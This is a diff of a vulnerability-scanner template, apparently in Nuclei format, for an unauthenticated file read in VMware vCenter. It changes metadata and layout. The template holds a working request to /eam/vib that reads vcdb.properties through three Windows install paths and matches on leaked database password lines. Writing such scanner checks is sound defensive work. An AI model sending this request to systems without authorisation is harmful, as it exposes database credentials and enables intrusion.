@@ -1,35 +1,34 @@
 id: vmware-vcenter-lfi
-
 info:
-  name: VMware vCenter Unauthenticated Arbitrary File Read
+  name: VMware vCenter - Local File Inclusion
   author: dwisiswant0
   severity: high
-  reference: |
+  description: VMware vCenter is vulnerable to local file inclusion.
+  reference:
     - https://kb.vmware.com/s/article/7960893
     - https://twitter.com/ptswarm/status/1316016337550938122
-  tags: vmware,lfi
-
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-22
+  tags: vmware,lfi,vcenter
 requests:
-  - payloads:
-      path:
-        - "C:\\ProgramData\\VMware\\VMware+VirtualCenter"  # vCenter Server 5.5 and earlier (Windows 2008)
-        - "C:\\Documents+and+Settings\\All+Users\\Application+Data\\VMware\\VMware+VirtualCenter"  # Other Windows versions
-        - "C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx"  # vCenter Server => 6.0
-    attack: sniper
-    raw:
+  - raw:
       - |
-        GET /eam/vib?id=§path§\vcdb.properties HTTP/1.1
+        GET /eam/vib?id={{path}}\vcdb.properties HTTP/1.1
         Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
-        Accept: */*
-        Accept-Language: en
-        Connection: close
+    payloads:
+      path:
+        - "C:\\ProgramData\\VMware\\VMware+VirtualCenter" # vCenter Server 5.5 and earlier (Windows 2008)
+        - "C:\\Documents+and+Settings\\All+Users\\Application+Data\\VMware\\VMware+VirtualCenter" # Other Windows versions
+        - "C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx" # vCenter Server => 6.0
     matchers-condition: and
     matchers:
       - type: regex
         regex:
           - "(?m)^(driver|dbtype|password(\\.encrypted)?)\\s="
-        part: body
       - type: status
         status:
           - 200
+
+# Enhanced by mp on 2022/08/01
